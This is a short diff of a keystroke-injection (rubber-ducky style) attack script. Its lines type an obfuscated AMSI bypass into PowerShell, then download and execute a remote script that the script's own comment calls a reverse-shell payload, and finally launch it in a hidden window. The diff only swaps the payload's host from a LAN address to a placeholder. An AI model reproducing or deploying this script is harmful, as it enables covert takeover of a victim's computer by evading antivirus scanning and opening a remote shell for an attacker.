@@ -41,7 +41,7 @@ STRING [Ref].Assembly.GetType('System.Management.Automation.'+$("41 6D 73 69 55 
 REM Bypass AMSI
 DELAY 300
 Enter
-STRING $Process = IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.5/meterman-64.ps1')
+STRING $Process = IEX(New-Object System.Net.WebClient).DownloadString('http://0.0.0.0/payload.ps1')
 REM Download, execute powershell reverseshell payload, and store in $Process
 ENTER
 STRING powershell -windowstyle hidden $Process 
